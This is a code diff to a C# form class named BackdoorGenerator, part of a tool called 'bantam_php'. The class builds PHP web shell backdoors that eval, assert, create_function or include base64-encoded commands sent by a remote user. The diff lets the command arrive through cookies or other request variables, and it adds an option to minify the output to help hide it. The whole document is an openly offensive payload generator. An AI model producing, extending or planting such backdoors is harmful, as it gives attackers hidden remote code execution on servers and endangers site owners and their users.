@@ -18,7 +18,8 @@ namespace bantam_php
         public BackdoorGenerator()
         {
             InitializeComponent();
-            comboBox1.SelectedIndex = 0;
+            comboBoxMethod.SelectedIndex = 0;
+            comboBoxVarType.SelectedIndex = 0;
             richTextBox1.Text = generateBackdoor();
         }
 
@@ -40,26 +41,26 @@ namespace bantam_php
         /// </summary>
         /// <param name="varName"></param>
         /// <returns></returns>
-        public string generateBackdoor(string varName = "command", BackdoorTypes backdoorType = BackdoorTypes.EVAL)
+        public string generateBackdoor(string varName = "command", string varType = "COOKIE", BackdoorTypes backdoorType = BackdoorTypes.EVAL)
         {
             string backdoor = "";
             switch(backdoorType)
             {
                 case BackdoorTypes.EVAL:
                     {
-                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
+                        backdoor = "<?php \r\nif(isset($_" + varType  + "['" + varName + "'])) {\r\n\t@eval(@urldecode(@base64_decode($_" + varType  + "['" + varName + "'])));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.ASSERT:
                     {
-                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n}";
+                        backdoor = "<?php \r\nif(isset($_" + varType  + "['" + varName + "'])) {\r\n\t@assert(@urldecode(@base64_decode($_" + varType  + "['" + varName + "'])));\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.CREATE_FUNCTION:
                     {
-                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$a=@create_function(null, @urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\t$a();\r\n}";
+                        backdoor = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, @urldecode(@base64_decode($_" + varType  + "['" + varName + "'])));\r\n\t$a();\r\n}";
                         break;
                     }
 
@@ -72,7 +73,7 @@ namespace bantam_php
 
                 case BackdoorTypes.TMP_INCLUDE:
                     {
-                        backdoor = "<?php \r\nif(isset($_REQUEST['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_REQUEST['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($f);\r\n}";
+                        backdoor = "<?php \r\nif(isset($_" + varType  + "['" + varName + "'])) {\r\n\t$fp = tmpfile();\r\n\t$tmpf=stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\tfwrite($fp, '<?php '.@urldecode(@base64_decode($_" + varType  + "['" + varName + "'])));\r\n\tinclude($tmpf);\r\n\tfclose($f);\r\n}";
                         break;
                     }
 
@@ -98,7 +99,14 @@ namespace bantam_php
         /// <param name="e"></param>
         private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
-            richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
+            if (chkbxMinifyCode.Checked)
+            {
+                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex));
+            }
+            else
+            {
+                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex);
+            }
         }
 
         /// <summary>
@@ -108,7 +116,14 @@ namespace bantam_php
         /// <param name="e"></param>
         private void txtBoxVarName_TextChanged(object sender, EventArgs e)
         {
-            richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
+            if (chkbxMinifyCode.Checked)
+            {
+                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex));
+            }
+            else
+            {
+                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex);
+            }
         }
 
         /// <summary>
@@ -135,11 +150,23 @@ namespace bantam_php
         {
             if (chkbxMinifyCode.Checked)
             {
-                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex));
+                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex));
             }
             else
             {
-                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, (BackdoorTypes)comboBox1.SelectedIndex);
+                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex);
+            }
+        }
+
+        private void comboBoxVarType_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (chkbxMinifyCode.Checked)
+            {
+                richTextBox1.Text = PHP_Helper.minifyCode(generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex));
+            }
+            else
+            {
+                richTextBox1.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text.ToUpper(), (BackdoorTypes)comboBoxMethod.SelectedIndex);
             }
         }
     }
